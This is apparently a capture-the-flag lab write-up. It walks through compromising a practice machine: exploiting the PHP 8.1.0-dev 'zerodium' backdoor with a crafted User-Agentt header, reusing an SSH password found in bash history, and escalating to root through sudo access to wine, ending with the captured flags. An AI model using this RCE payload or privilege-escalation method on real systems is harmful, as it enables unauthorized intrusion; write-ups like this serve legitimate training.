<img width="1342" height="517" alt="image" src="https://github.com/user-attachments/assets/4622065e-1224-4a4b-a793-ae0c10c280e4" />

#### Initial Reconnaissance

<img width="786" height="351" alt="image" src="https://github.com/user-attachments/assets/db3133b1-e1e9-49e8-8259-f1d6e224b86f" />

The objective was to identify the vulnerability in the unpatched development node.

- **Network Discovery:** Using `nmap -sC -sV 10.49.139.222`, I identified three open ports. Port `8080` was running **PHP 8.1.0-dev**, a known vulnerable version containing a backdoor.
- **Vulnerability:** This specific build allowed Remote Code Execution (RCE) by injecting a `User-Agentt` header (note the double 't') combined with the `zerodium` prefix.

### Foothold (Container Compromise)

**Execution:**

I confirmed RCE by sending a curl request

```
curl -H "User-Agentt: zerodiumsystem('id');" http://10.49.139.222:8080/
```

<img width="1522" height="125" alt="image" src="https://github.com/user-attachments/assets/1941fdab-64e9-4f74-a8c9-ef72020e868c" />

**Shell Stabilization:** I used a reverse shell to gain a foothold.

<img width="622" height="152" alt="image" src="https://github.com/user-attachments/assets/2d3015ff-3494-428d-9528-9da997251942" />

**Context:** Upon landing, I confirmed I was `root` but trapped inside a minimal Docker container (confirmed by `.dockerenv` and `/proc` filesystem analysis).
****

<img width="742" height="177" alt="image" src="https://github.com/user-attachments/assets/ae309d15-8f39-4389-8a7f-d5d0e50b4a57" />

- **Internal Discovery:** Inside the container, I inspected `/root/.bash_history` to find configuration secrets left by the developer.
- **Credentials Found:** The history contained: `sshpass -p 'Hoot3rN1ghtVis10n!' ssh strix@127.0.0.1`.

<img width="647" height="662" alt="image" src="https://github.com/user-attachments/assets/0daa9176-9e8a-490f-bd47-810961645e83" />

**Access:** I successfully logged into the host via SSH: `ssh strix@10.49.139.222`.
****

### Privilege Escalation

- **Permission Mapping:** Running `sudo -l` revealed that `strix` had `NOPASSWD` access to `/usr/bin/wine`.

<img width="956" height="166" alt="image" src="https://github.com/user-attachments/assets/d52012f5-7fd2-40fd-b8eb-4310c9637868" />

- **Exploitation Strategy:** Because `wine` maps the Linux host root (`/`) to its internal `Z:` drive, I used it to bypass shell restrictions.

**Extraction:**

1. **Locate Flag:** `sudo wine cmd /c dir Z:\\root\\` revealed `root.txt`.
2. **Read Flag:** `sudo wine cmd /c type Z:\\root\\root.txt` output the flag directly to the console, bypassing the need for an interactive shell.

<img width="596" height="572" alt="image" src="https://github.com/user-attachments/assets/121e9756-626a-43f4-abf5-97c3965c20d2" />

#### Captured Flags

- **User Flag:** `HNYX{30FD4C6999FED6EB19179D323D0C502DED96C2D7DC949D70}`
- **Root Flag:** `HNYX{026EBC25E942AE296D96E25B6C0832365603923F250C41E8}`
